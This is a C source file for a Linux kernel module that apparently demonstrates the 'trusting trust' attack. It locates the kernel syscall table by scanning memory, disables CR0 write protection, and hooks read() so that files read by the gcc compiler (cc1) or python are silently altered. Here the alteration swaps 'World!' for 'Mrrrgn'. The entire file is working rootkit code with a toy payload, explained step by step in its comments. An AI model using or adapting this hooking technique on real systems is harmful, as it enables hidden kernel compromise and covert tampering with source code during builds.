#include <linux/module.h> // needed for writing modules
#include <linux/kernel.h> // kernel helper functions like printk
#include <linux/syscalls.h> // The syscall table and __NR_<syscall_name> helpers
#include <asm/paravirt.h> // read_cr0, write_cr0
#include <linux/sched.h> // current task_struct

/* The normal sys_call_table is const but we can point our own variable
* its memory location to get around it.
*/
unsigned long **sys_call_table;
unsigned long original_cr0;

/* The prototype for the write syscall. This is where we'll store the original
 * before we swap it out in the sys_call_table.
 */
asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
    /* execute the original write call, and hold on to its return value
    * now we can add whatever we want to the buffer before exiting
    * the function.
    */
    long ret;
    ret = ref_sys_read(fd, buf, count);
	
    if (fd > 2) {
        /* We can find the current task name from the current task struct
         * then use that to decide if we'd like to swap out data
         * in the read buffer before returning to the user.
         * note: cc1 is the name of the task that opens source files
         * during compilation via gcc.
         */
        if (strcmp(current->comm, "cc1") == 0 || 
            strcmp(current->comm, "python") == 0) {
            char *substring = strstr(buf, "World!");
            if (substring != NULL) {
                substring[0] = 'M';
                substring[1] = 'r';
                substring[2] = 'r';
                substring[3] = 'r';
                substring[4] = 'g';
                substring[5] = 'n';
            }
        }
    }
    return ret;
}

static unsigned long **aquire_sys_call_table(void)
{
    /* PAGE_OFFSET is a macro which tells us the offset where kernel memory begins,
     * this keeps us from searching for our syscall table in user space memory
     * */
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;
	/* Scan memory searching for the syscall table, which is contigious */
	printk("Starting syscall table scan from: %lx\n", offset);
	while (offset < ULLONG_MAX) {
        /* cast our starting offset to match the system call table's type */
		sct = (unsigned long **)offset;

        /* We're scanning for a bit pattern that matches sct[__NR_close] 
         * so we just increase 'offset' until we find it.
         * */
		if (sct[__NR_close] == (unsigned long *) sys_close) {
			printk("Syscall table found at: %lx\n", offset);
			return sct;
		}

		offset += sizeof(void *);
	}
	return NULL;
}

static int __init trustingtrust_start(void)
{
    /* The whole trick here is to find the syscall table in memory
     * so we can copy it to a non-const pointer array,
     * then, turn off memory protection so that we can modify the
     * syscall table.
     */

    // Find the syscall table in memory
    if(!(sys_call_table = aquire_sys_call_table()))
        return -1;

    // record the initial value in the cr0 register
    original_cr0 = read_cr0();
    // set the cr0 register to turn off write protection
    write_cr0(original_cr0 & ~0x00010000);
    // copy the old read call
    ref_sys_read = (void *)sys_call_table[__NR_read]; 
    // write our modified read call to the syscall table
    sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
    // turn memory protection back on
    write_cr0(original_cr0);

	return 0;
}

static void __exit trustingtrust_end(void)
{
	if(!sys_call_table) {
		return;
	}

    // turn off memory protection
    write_cr0(original_cr0 & ~0x00010000);
    // put the old system call back in place
    sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
    // memory protection back on
    write_cr0(original_cr0);
}

module_init(trustingtrust_start);
module_exit(trustingtrust_end);

MODULE_LICENSE("GPL");
